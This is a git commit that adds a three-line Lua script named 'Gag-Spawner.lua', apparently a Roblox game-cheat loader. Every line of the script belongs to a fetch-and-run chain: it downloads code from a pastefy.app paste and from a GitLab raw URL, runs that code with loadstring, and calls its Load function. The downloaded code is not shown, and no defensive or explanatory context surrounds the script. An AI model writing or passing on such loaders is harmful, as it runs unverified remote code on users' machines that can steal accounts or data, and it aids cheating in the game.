55434b475ecef9032b23aa07a37d38c69b2eeac7
AhmadV99 <127880934+Zereppy@users.noreply.github.com>
2025-08-28 04:33:55 +0800

    Create Gag-Spawner.lua

---
+++ Gag-Spawner.lua
@@ -0,0 +1,3 @@
+loadstring(game:HttpGet("https://pastefy.app/dhTp1pCU/raw"))()
+local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
+Spawner.Load()
